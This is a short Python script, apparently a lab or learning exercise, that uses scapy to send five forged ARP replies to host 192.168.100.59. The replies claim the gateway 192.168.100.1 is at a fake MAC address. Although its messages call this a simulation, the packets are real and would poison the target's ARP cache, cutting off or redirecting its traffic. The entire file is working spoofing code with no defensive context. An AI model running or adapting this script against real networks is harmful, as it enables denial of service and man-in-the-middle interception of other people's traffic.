from scapy.all import ARP, send
import time

alvo_ip = "192.168.100.59"
ip = "192.168.100.1"
mac_simulacao = "aa:bb:cc:dd:ee:ff"

pacote = ARP(op=2, psrc=ip, pdst=alvo_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_simulacao)

print(f"Simulando ARP spoofing... Enviando pacotes para {alvo_ip} simulado {ip} é {mac_simulacao}")

for _ in range(5):
    send(pacote, verbose=0)
    time.sleep(1)

print("Pacotes ARP falsos enviados.")
